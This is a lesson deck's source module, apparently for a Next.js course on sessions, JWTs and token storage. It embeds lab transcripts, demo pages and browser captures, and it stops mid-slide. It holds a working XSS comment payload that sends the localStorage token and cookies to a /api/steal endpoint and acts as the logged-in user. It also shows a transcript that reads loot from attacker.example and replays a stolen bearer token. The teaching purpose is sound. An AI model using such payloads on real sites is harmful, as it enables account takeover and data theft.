/*DU_LIEU*/
const DU_LIEU = {
 "n15-1:file:src/app/dangnhap/page.tsx": "'use client';\n// app/dangnhap/page.tsx — two ways to keep the proof: a JWT in localStorage, or a JWT in an httpOnly cookie\nimport { useState } from 'react';\n\nconst post = (body: object) =>\n  fetch('/api/login', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });\n\nexport default function DangNhap() {\n  const [log, setLog] = useState<string[]>([]);\n  const ghi = (s: string) => setLog((l) => [...l, s]);\n  async function loginLocalStorage() {\n    const { token } = await (await post({ name: 'An', mode: 'json' })).json();\n    localStorage.setItem('token', token);              // the token is now readable by ANY script on the page\n    ghi('localStorage: token saved');\n  }\n  async function loginCookie() {\n    await post({ name: 'An', mode: 'cookie' });       // Set-Cookie: token=…; HttpOnly — JS never sees it\n    ghi('cookie: server set an httpOnly cookie');\n  }\n  async function me(withHeader: boolean) {\n    const t = localStorage.getItem('token');\n    const r = await fetch('/api/me', withHeader && t ? { headers: { Authorization: `Bearer ${t}` } } : {});\n    ghi(`/api/me ${withHeader ? '+ Bearer header' : '(no header)'} → ${r.status}`);\n  }\n  return (\n    <main className=\"p-4 text-lg space-y-2\">\n      <div className=\"space-x-2\">\n        <button id=\"ls\" className=\"border px-2\" onClick={loginLocalStorage}>Log in → localStorage</button>\n        <button id=\"ck\" className=\"border px-2\" onClick={loginCookie}>Log in → httpOnly cookie</button>\n      </div>\n      <div className=\"space-x-2\">\n        <button id=\"me0\" className=\"border px-2\" onClick={() => me(false)}>GET /api/me</button>\n        <button id=\"me1\" className=\"border px-2\" onClick={() => me(true)}>GET /api/me + header</button>\n        <button id=\"doc\" className=\"border px-2\" onClick={() => ghi(`document.cookie = \"${document.cookie}\" · localStorage.token = ${localStorage.getItem('token')?.slice(0, 16) ?? 'null'}…`)}>What can JS read?</button>\n      </div>\n      <ol id=\"log\" className=\"font-mono text-sm\">{log.map((s, i) => <li key={i}>{s}</li>)}</ol>\n    </main>\n  );\n}\n",
 "n15-1:file:src/app/xss/page.tsx": "// app/xss/page.tsx — a comment list that renders user HTML (the XSS bug); one comment carries an attacker's script\nimport { BinhLuan } from './BinhLuan';\n\nconst COMMENTS = [\n  'Great lesson!',\n  // the attacker's \"comment\": an image that fails to load and runs JavaScript in YOUR page\n  `<img src=\"x\" onerror=\"fetch('/api/steal',{method:'POST',body:JSON.stringify({localStorage:localStorage.getItem('token'),documentCookie:document.cookie})});fetch('/api/me').then(r=>r.json()).then(j=>fetch('/api/steal',{method:'POST',body:JSON.stringify({actedAsUser:j})}))\">nice 👍`,\n];\n\nexport default function Trang() {\n  return <main className=\"p-4 text-lg\"><h1 className=\"font-bold\">Comments</h1>{COMMENTS.map((c, i) => <BinhLuan key={i} html={c} />)}</main>;\n}\n",
 "n15-1:file:src/app/xss/BinhLuan.tsx": "'use client';\n// app/xss/BinhLuan.tsx — the bug: user text rendered as HTML\nexport function BinhLuan({ html }: { html: string }) {\n  return <p className=\"border-b py-1\" dangerouslySetInnerHTML={{ __html: html }} />;\n}\n",
 "n15-1:file:src/app/admin/page.tsx": "// app/admin/page.tsx — \"protected\" only because no menu links here. Nothing checks who is asking.\nexport const dynamic = 'force-dynamic';\nexport default function Admin() {\n  return <main className=\"p-4 text-lg\"><h1 className=\"font-bold\">Admin</h1><p id=\"secret\">Revenue this month: 1,250,000,000 ₫ · 3 refunds pending</p></main>;\n}\n",
 "n15-1:file:src/app/admin2/page.tsx": "// app/admin2/page.tsx — the page that owns the data checks the session itself\nimport { cookies } from 'next/headers';\nimport { redirect } from 'next/navigation';\nimport { verifyJwt } from '@/lib/auth';\n\nexport default async function Admin2() {\n  const payload = await verifyJwt((await cookies()).get('token')?.value);\n  if (payload?.role !== 'admin') redirect('/login');\n  return <main className=\"p-4 text-lg\"><h1 className=\"font-bold\">Admin</h1><p id=\"secret\">Revenue this month: 1,250,000,000 ₫ · 3 refunds pending</p></main>;\n}\n",
 "n15-1:xay": "$ npx next typegen >/dev/null 2>&1; npx tsc --noEmit && echo 'tsc: 0 lỗi'\ntsc: 0 lỗi\n$ npm run build 2>&1 | grep -E 'Compiled|/admin|/api/(login|me)|/dangnhap|/xss'\n✓ Compiled successfully in 4.0s\n├ ƒ /admin\n├ ƒ /admin2\n├ ƒ /api/login\n├ ƒ /api/me\n├ ○ /dangnhap\n└ ○ /xss",
 "n15-1:jwt": "$ curl -si -X POST localhost:3000/api/login -d '{\"name\":\"An\"}' | grep -i set-cookie\nset-cookie: token=eyJhbGciOiJI…(JWT); Path=/; Expires=Sat, 21 Nov 2026 04:11:45 GMT; Max-Age=604800; HttpOnly; SameSite=lax\n$ echo -n $T | wc -c          # how big is the proof?\nJWT: 161 ký tự · 3 phần (header.payload.signature)\n$ node -e \"…\" $T              # base64url-decode header and payload — NO key needed\nheader : {\"alg\":\"HS256\"}\npayload: {\"name\":\"An\",\"role\":\"admin\",\"sub\":\"1\",\"iat\":1794629505,\"exp\":1794633105}\n$ curl -s localhost:3000/api/me -H \"Cookie: token=$T\"\n{\"via\":\"cookie\",\"user\":{\"id\":1,\"name\":\"An\",\"role\":\"admin\"}}\n$ # tamper: change \"role\":\"admin\" in the payload of a user's token, keep the signature\nBinh, gốc : {\"name\":\"Binh\",\"role\":\"user\",\"sub\":\"2\",\"iat\":1794629505,\"exp\":1794633105}\nBinh, sửa : {\"name\":\"Binh\",\"role\":\"admin\",\"sub\":\"2\",\"iat\":1794629505,\"exp\":1794633105}\n$ curl -si localhost:3000/api/me -H \"Cookie: token=$FORGED\" | head -1\nHTTP/1.1 401 Unauthorized\n{\"error\":\"unauthorized\"}\n[api] GET /api/me #1\n[api] POST /api/login #2\n[api] GET /api/me #2\n[auth] verify failed: ERR_JWS_SIGNATURE_VERIFICATION_FAILED",
 "n15-1:thuhoi": "# JWT: log in, keep a copy of the token, log out, use the copy\n$ curl -s -c /tmp/c15-jar -X POST 127.0.0.1:19310/api/login -H 'content-type: application/json' -d '{\"name\":\"An\"}'; echo; awk '$6==\"token\"{print $7}' /tmp/c15-jar > /tmp/c15-copy\n{\"ok\":true,\"name\":\"An\"}\n$ curl -s -b /tmp/c15-jar -c /tmp/c15-jar -X POST 127.0.0.1:19310/api/logout; echo\n{\"ok\":true}\n$ curl -s localhost:3000/api/me -b jar          # the browser after logout\n401\n$ curl -s localhost:3000/api/me -H \"Cookie: token=$COPY\"   # a stolen copy, after logout\n200\n# Server session: same steps\n$ curl -s -c /tmp/c15-jar2 -X POST 127.0.0.1:19310/api/login -H 'content-type: application/json' -d '{\"name\":\"An\",\"mode\":\"session\"}'; echo; awk '$6==\"sid\"{print $7}' /tmp/c15-jar2 > /tmp/c15-sid\n{\"ok\":true,\"name\":\"An\"}\n$ curl -s -b /tmp/c15-jar2 -c /tmp/c15-jar2 -X POST 127.0.0.1:19310/api/logout; echo\n{\"ok\":true}\n$ curl -s localhost:3000/api/me -H \"Cookie: sid=$COPY\"     # a stolen copy, after logout\n401",
 "n15-1:admin": "# nothing links to /admin — but anyone can type it\n$ curl -si localhost:3000/admin | grep -E '^HTTP|Revenue'\nHTTP/1.1 200\nRevenue this month: 1,250,000,000 ₫ · 3 refunds pending\n$ curl -si localhost:3000/admin2 | grep -iE '^HTTP|^location|Revenue'\nHTTP/1.1 307 Temporary Redirect\nlocation: /login\n$ curl -si localhost:3000/admin2 -H \"Cookie: token=$AN\" | grep -E '^HTTP|Revenue'\nHTTP/1.1 200\nRevenue this month: 1,250,000,000 ₫ · 3 refunds pending",
 "n15-1:kho": "$ grep -n -A6 'response.cookies.set(\"backend_token\"' src/app/api/auth/login/route.ts | head -8\n99:    response.cookies.set(\"backend_token\", token, {\n100-      httpOnly: true,\n101-      secure: process.env.NODE_ENV === \"production\",\n102-      sameSite: \"lax\",\n103-      maxAge: 60 * 60 * 24 * 30, // 30 ngày (08/11/2026), gia hạn trượt: lib/hetPhien.ts\n104-      path: \"/\",\n105-    });\n$ grep -n \"token is NOT persisted\\|JWT lives only\\|XSS attack vector\" src/store/authStore.ts\n173:        // NOTE: token is NOT persisted to localStorage.\n174:        // The JWT lives only in the httpOnly backend_token cookie.\n176:        // Persisting the token in localStorage is an XSS attack vector.\n$ grep -rnE \"localStorage\\.setItem\\(['\\\"](token|backend_token|accessToken)\" src | wc -l | sed 's/^ */localStorage.setItem(token…) trong src: /'\nlocalStorage.setItem(token…) trong src: 0\n$ grep -n \"JWT_EXPIRES_IN\" ../.env.example\n33:JWT_EXPIRES_IN=\"24h\"",
 "n15-1:trom": "# the attacker's server received (from the two Chromium runs):\n$ curl -s attacker.example/loot\n{\"localStorage\":\"eyJhbGciOiJIU…\",\"documentCookie\":\"\"}\n{\"actedAsUser\":{\"error\":\"unauthorized\"}}\n{\"localStorage\":null,\"documentCookie\":\"\"}\n{\"actedAsUser\":{\"via\":\"cookie\",\"user\":{\"id\":1,\"name\":\"An\",\"role\":\"admin\"}}}\n$ curl -s localhost:3000/api/me -H \"Authorization: Bearer $STOLEN\"   # from the attacker's own machine, hours later\n{\"via\":\"bearer\",\"user\":{\"id\":1,\"name\":\"An\",\"role\":\"admin\"}}",
 "n15-1:dung": "",
 "anh-nxj-15-1:ls": {
  "url": "http://127.0.0.1:19310/dangnhap",
  "vp": [
   640,
   180
  ],
  "rect": {},
  "mang": [
   {
    "url": "http://127.0.0.1:19310/dangnhap",
    "ma": 200,
    "loai": "document",
    "kt": 7684
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/1nyapq0urr5k7.css",
    "ma": 200,
    "loai": "stylesheet",
    "kt": 15681
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/media/605ce01b664af129-s.p.0wgildi0cnwt9.woff2",
    "ma": 200,
    "loai": "font",
    "kt": 29288
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/media/07a39a8a4660cc7c-s.p.0r6juujl39pe6.woff2",
    "ma": 200,
    "loai": "font",
    "kt": 23108
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/1ibtvzvb55f-7.js",
    "ma": 200,
    "loai": "script",
    "kt": 1708
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/0kqziy-7_gy73.js",
    "ma": 200,
    "loai": "script",
    "kt": 22335
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/3qfy96eoyh-ek.js",
    "ma": 200,
    "loai": "script",
    "kt": 13994
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/turbopack-2u1d16houkiyo.js",
    "ma": 200,
    "loai": "script",
    "kt": 9974
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/395glp5--7qza.js",
    "ma": 200,
    "loai": "script",
    "kt": 181715
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/092r-mewpaf3q.js",
    "ma": 200,
    "loai": "script",
    "kt": 229052
   },
   {
    "url": "http://127.0.0.1:19310/api/login",
    "ma": 200,
    "loai": "fetch",
    "kt": 173,
    "pt": "POST",
    "ctq": "application/json",
    "ct": "application/json",
    "than": "{\"name\":\"An\",\"mode\":\"json\"}",
    "ms": 565,
    "ve": 565
   },
   {
    "url": "http://127.0.0.1:19310/api/me",
    "ma": 401,
    "loai": "fetch",
    "kt": 24
   },
   {
    "url": "http://127.0.0.1:19310/api/me",
    "ma": 200,
    "loai": "fetch",
    "kt": 59
   }
  ],
  "console": [
   {
    "kieu": "error",
    "chu": "Failed to load resource: the server responded with a status of 401 (Unauthorized)"
   }
  ],
  "ketQua": {
   "log": "localStorage: token saved | /api/me (no header) → 401 | /api/me + Bearer header → 200 | document.cookie = \"\" · localStorage.token = eyJhbGciOiJIUzI1…"
  }
 },
 "anh-nxj-15-1:ck": {
  "url": "http://127.0.0.1:19310/dangnhap",
  "vp": [
   640,
   180
  ],
  "rect": {},
  "mang": [
   {
    "url": "http://127.0.0.1:19310/dangnhap",
    "ma": 200,
    "loai": "document",
    "kt": 7684
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/1nyapq0urr5k7.css",
    "ma": 200,
    "loai": "stylesheet",
    "kt": 15681
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/media/605ce01b664af129-s.p.0wgildi0cnwt9.woff2",
    "ma": 200,
    "loai": "font",
    "kt": 29288
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/media/07a39a8a4660cc7c-s.p.0r6juujl39pe6.woff2",
    "ma": 200,
    "loai": "font",
    "kt": 23108
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/0kqziy-7_gy73.js",
    "ma": 200,
    "loai": "script",
    "kt": 22335
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/turbopack-2u1d16houkiyo.js",
    "ma": 200,
    "loai": "script",
    "kt": 9974
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/3qfy96eoyh-ek.js",
    "ma": 200,
    "loai": "script",
    "kt": 13994
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/1ibtvzvb55f-7.js",
    "ma": 200,
    "loai": "script",
    "kt": 1708
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/395glp5--7qza.js",
    "ma": 200,
    "loai": "script",
    "kt": 181715
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/092r-mewpaf3q.js",
    "ma": 200,
    "loai": "script",
    "kt": 229052
   },
   {
    "url": "http://127.0.0.1:19310/api/login",
    "ma": 200,
    "loai": "fetch",
    "kt": 23,
    "pt": "POST",
    "ctq": "application/json",
    "ct": "application/json",
    "than": "{\"name\":\"An\",\"mode\":\"cookie\"}",
    "ms": 550,
    "ve": 556
   },
   {
    "url": "http://127.0.0.1:19310/api/me",
    "ma": 200,
    "loai": "fetch",
    "kt": 59
   }
  ],
  "console": [],
  "ketQua": {
   "log": "cookie: server set an httpOnly cookie | /api/me (no header) → 200 | document.cookie = \"\" · localStorage.token = null…"
  }
 },
 "anh-nxj-15-1:xss-ls": {
  "url": "http://127.0.0.1:19310/dangnhap",
  "vp": [
   640,
   140
  ],
  "rect": {},
  "mang": [
   {
    "url": "http://127.0.0.1:19310/dangnhap",
    "ma": 200,
    "loai": "document",
    "kt": 7684
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/1nyapq0urr5k7.css",
    "ma": 200,
    "loai": "stylesheet",
    "kt": 15681
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/media/07a39a8a4660cc7c-s.p.0r6juujl39pe6.woff2",
    "ma": 200,
    "loai": "font",
    "kt": 23108
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/media/605ce01b664af129-s.p.0wgildi0cnwt9.woff2",
    "ma": 200,
    "loai": "font",
    "kt": 29288
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/0kqziy-7_gy73.js",
    "ma": 200,
    "loai": "script",
    "kt": 22335
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/3qfy96eoyh-ek.js",
    "ma": 200,
    "loai": "script",
    "kt": 13994
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/1ibtvzvb55f-7.js",
    "ma": 200,
    "loai": "script",
    "kt": 1708
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/turbopack-2u1d16houkiyo.js",
    "ma": 200,
    "loai": "script",
    "kt": 9974
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/395glp5--7qza.js",
    "ma": 200,
    "loai": "script",
    "kt": 181715
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/092r-mewpaf3q.js",
    "ma": 200,
    "loai": "script",
    "kt": 229052
   },
   {
    "url": "http://127.0.0.1:19310/api/login",
    "ma": 200,
    "loai": "fetch",
    "kt": 173,
    "pt": "POST",
    "ctq": "application/json",
    "ct": "application/json",
    "than": "{\"name\":\"An\",\"mode\":\"json\"}",
    "ms": 570,
    "ve": 575
   },
   {
    "url": "http://127.0.0.1:19310/xss",
    "ma": 200,
    "loai": "document",
    "kt": 7919
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/media/07a39a8a4660cc7c-s.p.0r6juujl39pe6.woff2",
    "ma": 200,
    "loai": "font",
    "kt": 0
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/media/605ce01b664af129-s.p.0wgildi0cnwt9.woff2",
    "ma": 200,
    "loai": "font",
    "kt": 0
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/1nyapq0urr5k7.css",
    "ma": 200,
    "loai": "stylesheet",
    "kt": 15681
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/0kqziy-7_gy73.js",
    "ma": 200,
    "loai": "script",
    "kt": 22335
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/395glp5--7qza.js",
    "ma": 200,
    "loai": "script",
    "kt": 181715
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/092r-mewpaf3q.js",
    "ma": 200,
    "loai": "script",
    "kt": 229052
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/turbopack-2u1d16houkiyo.js",
    "ma": 200,
    "loai": "script",
    "kt": 9974
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/3qfy96eoyh-ek.js",
    "ma": 200,
    "loai": "script",
    "kt": 13994
   },
   {
    "url": "http://127.0.0.1:19310/x",
    "ma": 404,
    "loai": "image",
    "kt": 9
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/10b7ximy8i1j0.js",
    "ma": 200,
    "loai": "script",
    "kt": 279
   },
   {
    "url": "http://127.0.0.1:19310/api/steal",
    "ma": 200,
    "loai": "fetch",
    "kt": 11,
    "pt": "POST",
    "ctq": "text/plain;charset=UTF-8",
    "ct": "application/json",
    "than": "{\"localStorage\":\"eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiQW4i…(payload)….<chu-ky-lab>\",\"documentCookie\":\"\"}",
    "ms": 989,
    "ve": 1036
   },
   {
    "url": "http://127.0.0.1:19310/api/me",
    "ma": 401,
    "loai": "fetch",
    "kt": 24
   },
   {
    "url": "http://127.0.0.1:19310/api/steal",
    "ma": 200,
    "loai": "fetch",
    "kt": 11,
    "pt": "POST",
    "ctq": "text/plain;charset=UTF-8",
    "ct": "application/json",
    "than": "{\"actedAsUser\":{\"error\":\"unauthorized\"}}",
    "ms": 1038,
    "ve": 1041
   },
   {
    "url": "http://127.0.0.1:19310/api/steal",
    "ma": 200,
    "loai": "fetch",
    "kt": 243
   }
  ],
  "console": [
   {
    "kieu": "error",
    "chu": "Failed to load resource: the server responded with a status of 404 (Not Found)"
   },
   {
    "kieu": "error",
    "chu": "Failed to load resource: the server responded with a status of 401 (Unauthorized)"
   }
  ],
  "ketQua": {
   "loot": "[{\"localStorage\":\"eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiQW4i…(payload)….<chu-ky-lab>\",\"documentCookie\":\"\"},{\"actedAsUser\":{\"error\":\"unauthorized\"}}]"
  }
 },
 "anh-nxj-15-1:xss-ck": {
  "url": "http://127.0.0.1:19310/dangnhap",
  "vp": [
   640,
   140
  ],
  "rect": {},
  "mang": [
   {
    "url": "http://127.0.0.1:19310/dangnhap",
    "ma": 200,
    "loai": "document",
    "kt": 7684
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/1nyapq0urr5k7.css",
    "ma": 200,
    "loai": "stylesheet",
    "kt": 15681
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/media/07a39a8a4660cc7c-s.p.0r6juujl39pe6.woff2",
    "ma": 200,
    "loai": "font",
    "kt": 23108
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/media/605ce01b664af129-s.p.0wgildi0cnwt9.woff2",
    "ma": 200,
    "loai": "font",
    "kt": 29288
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/1ibtvzvb55f-7.js",
    "ma": 200,
    "loai": "script",
    "kt": 1708
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/0kqziy-7_gy73.js",
    "ma": 200,
    "loai": "script",
    "kt": 22335
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/turbopack-2u1d16houkiyo.js",
    "ma": 200,
    "loai": "script",
    "kt": 9974
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/3qfy96eoyh-ek.js",
    "ma": 200,
    "loai": "script",
    "kt": 13994
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/395glp5--7qza.js",
    "ma": 200,
    "loai": "script",
    "kt": 181715
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/092r-mewpaf3q.js",
    "ma": 200,
    "loai": "script",
    "kt": 229052
   },
   {
    "url": "http://127.0.0.1:19310/api/login",
    "ma": 200,
    "loai": "fetch",
    "kt": 23,
    "pt": "POST",
    "ctq": "application/json",
    "ct": "application/json",
    "than": "{\"name\":\"An\",\"mode\":\"cookie\"}",
    "ms": 547,
    "ve": 552
   },
   {
    "url": "http://127.0.0.1:19310/xss",
    "ma": 200,
    "loai": "document",
    "kt": 7919
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/media/07a39a8a4660cc7c-s.p.0r6juujl39pe6.woff2",
    "ma": 200,
    "loai": "font",
    "kt": 0
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/media/605ce01b664af129-s.p.0wgildi0cnwt9.woff2",
    "ma": 200,
    "loai": "font",
    "kt": 0
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/1nyapq0urr5k7.css",
    "ma": 200,
    "loai": "stylesheet",
    "kt": 15681
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/0kqziy-7_gy73.js",
    "ma": 200,
    "loai": "script",
    "kt": 22335
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/395glp5--7qza.js",
    "ma": 200,
    "loai": "script",
    "kt": 181715
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/092r-mewpaf3q.js",
    "ma": 200,
    "loai": "script",
    "kt": 229052
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/turbopack-2u1d16houkiyo.js",
    "ma": 200,
    "loai": "script",
    "kt": 9974
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/3qfy96eoyh-ek.js",
    "ma": 200,
    "loai": "script",
    "kt": 13994
   },
   {
    "url": "http://127.0.0.1:19310/x",
    "ma": 404,
    "loai": "image",
    "kt": 9
   },
   {
    "url": "http://127.0.0.1:19310/_next/static/chunks/10b7ximy8i1j0.js",
    "ma": 200,
    "loai": "script",
    "kt": 279
   },
   {
    "url": "http://127.0.0.1:19310/api/me",
    "ma": 200,
    "loai": "fetch",
    "kt": 59
   },
   {
    "url": "http://127.0.0.1:19310/api/steal",
    "ma": 200,
    "loai": "fetch",
    "kt": 11,
    "pt": "POST",
    "ctq": "text/plain;charset=UTF-8",
    "ct": "application/json",
    "than": "{\"localStorage\":null,\"documentCookie\":\"\"}",
    "ms": 967,
    "ve": 1011
   },
   {
    "url": "http://127.0.0.1:19310/api/steal",
    "ma": 200,
    "loai": "fetch",
    "kt": 11,
    "pt": "POST",
    "ctq": "text/plain;charset=UTF-8",
    "ct": "application/json",
    "than": "{\"actedAsUser\":{\"via\":\"cookie\",\"user\":{\"id\":1,\"name\":\"An\",\"role\":\"admin\"}}}",
    "ms": 1012,
    "ve": 1014
   },
   {
    "url": "http://127.0.0.1:19310/api/steal",
    "ma": 200,
    "loai": "fetch",
    "kt": 361
   }
  ],
  "console": [
   {
    "kieu": "error",
    "chu": "Failed to load resource: the server responded with a status of 404 (Not Found)"
   }
  ],
  "ketQua": {
   "loot": "[{\"localStorage\":\"eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiQW4i…(payload)….<chu-ky-lab>\",\"documentCookie\":\"\"},{\"actedAsUser\":{\"error\":\"unauthorized\"}},{\"localStorage\":null,\"documentCookie\":\"\"},{\"actedAsUser\":{\"via\":\"cookie\",\"user\":{\"id\":1,\"name\":\"An\",\"role\":\"admin\"}}}]"
  }
 }
};
/*HET_DU_LIEU*/
import { lamDeck, tsx, tn, br, box, two, steps, kw, c, cmp, icards, seq } from './_nxj-chung.mjs';

export const deck = { key: 'nxj-15-1', code: 'NXJ 15.1', title: 'Auth foundations: sessions, JWTs, and where the token lives', sub: 'Chapter 15 · Lesson 15.1' };
const O = (k) => { const v = DU_LIEU[`n15-1:${k}`]; if (v === undefined) throw new Error('thiếu ' + k); return v; };
const A = (k) => { const v = DU_LIEU[`anh-nxj-15-1:${k}`]; if (!v) throw new Error('thiếu ảnh ' + k); return v; };
const D = (...a) => `<div>${a.join('')}</div>`;
const F = (p) => O(`file:${p}`).trim();
const bo = (s) => s.split('\n').filter((l) => !/^\/\/ (app|lib)\//.test(l)).join('\n');
const doan = (k, dau) => { const ls = O(k).split('\n'); const i = ls.findIndex((l) => l.startsWith('$ ') && l.includes(dau)); if (i < 0) throw new Error('không thấy ' + dau + ' trong ' + k); const r = []; for (let j = i + 1; j < ls.length && !ls[j].startsWith('$ ') && !ls[j].startsWith('# '); j++) if (ls[j].trim()) r.push(ls[j]); return r; };
const B = (ten, o) => br('nxj-15-1', ten, { vp: 640, ...o });

// ── số đo (n15-1 · lab c15 · Next.js 16.4.6 · jose 6.2.17 · next start · Chromium)
const SC = doan('jwt', 'grep -i set-cookie'), LEN = doan('jwt', 'wc -c'), DEC = doan('jwt', 'base64url-decode');
const TAMPER = doan('jwt', 'tamper'), FORGED = doan('jwt', 'FORGED').filter((l) => !l.startsWith('['));
const LOG = O('jwt').split('\n').filter((l) => l.startsWith('[auth]'));
const TH = O('thuhoi').split('\n');
const ADM = doan('admin', 'localhost:3000/admin |'), ADM2 = doan('admin', "admin2 | grep -iE"), ADM3 = doan('admin', 'admin2 -H');
const so = TH.filter((l) => /^\d{3}$/.test(l));
const kq = (dau) => doan('thuhoi', dau)[0];
const THUHOI = ['# JWT: log in, keep a copy, log out, use the copy',
  `$ curl -c jar -X POST /api/login -d '{"name":"An"}'`, kq('"name":"An"}\''),
  '$ curl -b jar -c jar -X POST /api/logout', kq('c15-jar -c /tmp/c15-jar'),
  '$ curl /api/me -b jar                    # the browser', so[0],
  '$ curl /api/me -H "Cookie: token=$COPY"  # stolen copy', so[1],
  '# Server session: same steps',
  `$ curl -c jar -X POST /api/login -d '{"name":"An","mode":"session"}'`, kq('"mode":"session"'),
  '$ curl -b jar -c jar -X POST /api/logout', kq('c15-jar2 -c'),
  '$ curl /api/me -H "Cookie: sid=$COPY"    # stolen copy', so[2]].join('\n');
const LOOT = doan('trom', 'attacker.example/loot'), REPLAY = doan('trom', 'Bearer $STOLEN');
const LS = A('ls').ketQua.log.split(' | '), CK = A('ck').ketQua.log.split(' | ');
const KHO = O('kho');
if (!/HttpOnly; SameSite=lax/.test(SC[0]) || !/^JWT: 161/.test(LEN[0])) throw new Error('set-cookie đổi');
if (!/"role":"admin","sub":"1"/.test(DEC[1]) || !/401 Unauthorized/.test(FORGED[0]) || !/ERR_JWS_SIGNATURE_VERIFICATION_FAILED/.test(LOG.join(''))) throw new Error('jwt đổi');
if (so.join(',') !== '401,200,401') throw new Error('thu hồi đổi: ' + so);
if (!/→ 401/.test(LS[1]) || !/→ 200/.test(LS[2]) || !/→ 200/.test(CK[1]) || !/document.cookie = ""/.test(CK[2])) throw new Error('đăng nhập đổi');
if (!/"localStorage":"eyJ/.test(LOOT[0]) || !/"localStorage":null,"documentCookie":""/.test(LOOT[2]) || !/"via":"cookie"/.test(LOOT[3]) || !/"via":"bearer"/.test(REPLAY[0])) throw new Error('xss đổi');
if (!/200/.test(ADM[0]) || !/Revenue/.test(ADM[1]) || !/307/.test(ADM2[0]) || !/location: \/login/.test(ADM2[1])) throw new Error('admin đổi');

const ADMIN2 = bo(F('src/app/admin2/page.tsx'))
  .replace("const payload = await verifyJwt((await cookies()).get('token')?.value);", "const token = (await cookies()).get('token')?.value;\n  const payload = await verifyJwt(token);")
  .replace(/return <main.*$/m, "return <main><h1>Admin</h1><p>Revenue …</p></main>;");
if (!ADMIN2.includes("const token =") || !ADMIN2.includes('Revenue …')) throw new Error('admin2 đổi');
const PAYLOAD = `<img src="x" onerror="
  fetch('/api/steal', { method: 'POST', body: JSON.stringify({
    localStorage: localStorage.getItem('token'),
    documentCookie: document.cookie }) });
  fetch('/api/me').then(r => r.json()).then(j =>
    fetch('/api/steal', { method: 'POST',
      body: JSON.stringify({ actedAsUser: j }) }))">nice 👍`;

export const S = [
  { cover: true, nhan: 'Chapter 15 · Lesson 15.1', t: 'Auth foundations:<br>sessions, JWTs,<br>and where the token lives', sub: 'Who is this user — and where do we keep the proof? A JWT decoded, a stolen copy replayed, and one XSS run against both storage choices',
    en: 'Lesson fifteen point one: auth foundations — sessions, JWTs, and where the token lives. We decode a real JWT, replay a stolen copy after logout, and run one XSS attack against both places a token can live.' },
  { t: 'What you will take away from this lesson', to: true, giua: true, body: `<ul>
    <li><b>Authentication</b> (who you are) vs <b>authorisation</b> (what you may do)</li>
    <li>Two models: a <b>server session</b> (an id, looked up) and a <b>JWT</b> (a signed token)</li>
    <li>What a JWT really is: <b>signed, not encrypted</b> — decoded with no key, measured</li>
    <li>Logging out and a stolen copy: JWT <b>200</b> vs session <b>401</b></li>
    <li>localStorage vs httpOnly cookie under a real XSS — and the route only a hidden link protects</li></ul>`,
    en: 'Five takeaways: authentication versus authorisation; the two models, a server session and a JWT; what a JWT really is, signed but not encrypted; what logout does to a stolen copy under each model; and where the token must live, tested under a real XSS, plus the route protected only by a hidden link.' },
  { t: 'Two questions, two models', body: two(D(box('Authentication — "who are you?"', 'Proved once at login: a password, an OAuth callback. This chapter.', 'lam'), box('Authorisation — "may you do this?"', 'Decided on every action, per resource: may <b>An</b> edit note 13? (Chapter 12 · Server Actions)', 'lam')),
    cmp(['', 'Server session', 'JWT (token)'], [
